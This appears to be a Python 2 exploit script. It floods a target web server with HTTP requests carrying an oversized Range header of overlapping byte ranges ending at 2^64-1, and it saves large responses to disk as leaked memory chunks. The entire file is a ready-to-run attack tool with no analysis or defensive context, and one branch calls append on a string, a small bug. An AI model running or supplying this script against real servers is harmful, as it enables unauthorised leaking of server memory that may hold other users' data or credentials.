import socket 
from socket import error as SocketError
import errno
import time
import sys
import os

try:
	request_host = sys.argv[1]
	request_file = sys.argv[2]
	directory = sys.argv[3]
except:
	print "You should run the crap as follows: {} <target host> <target file> <output dir>".format(sys.argv[0])
	sys.exit(-1)
	

range_header_increment = ",1-18446744073709551615,2-18446744073709551615,3-18446744073709551615,4-18446744073709551615,5-18446744073709551615"
range_header = "Range: bytes=0-18446744073709551615{}".format(range_header_increment*10)
request_template = ["GET /{} HTTP/1.1",
            "Host: {}",
            "{}",
            "",
            "\r\n"]

if not os.path.exists(directory):
    os.makedirs(directory)
i = 0
try:
    while True:
        i+=1
        range_header += range_header_increment
        request = "\r\n".join(line for line in request_template).format(request_file,request_host,range_header)    

        try:
            s = socket.socket()
            s.settimeout(5)

            s.connect((request_host,80))
            s.send(request)
        except Exception, e:
            print e
            time.sleep(5)
            continue
        print "{} iteration. send ok".format(i)
        response=""
        while 1:
            data = ""
            try:
                data = s.recv(1024)
                if data == "":
                    print 456
                    range_header = "Range: bytes=0-18446744073709551615{}".format(range_header_increment*10)
                    break
            except socket.timeout:
                print data
                if data:
                    response.append(data)                
                break
            except SocketError as e:
                print e
                if e.errno != errno.ECONNRESET:

                    pass
                else:
                    break
            except Exception, e:
                print e
                range_header = "Range: bytes=0-18446744073709551615{}".format(range_header_increment*10)
                break
            if data:
                response+=data
        s.close()
        print "received {} bytes of data".format(len(''.join(response)))
        #Should be something like the size of original response
        if len(response) > 1000:
            with open('{}/chunk_{}'.format(directory,i), 'w') as file_:
                file_.write(response)
except KeyboardInterrupt:
    print data
    pass
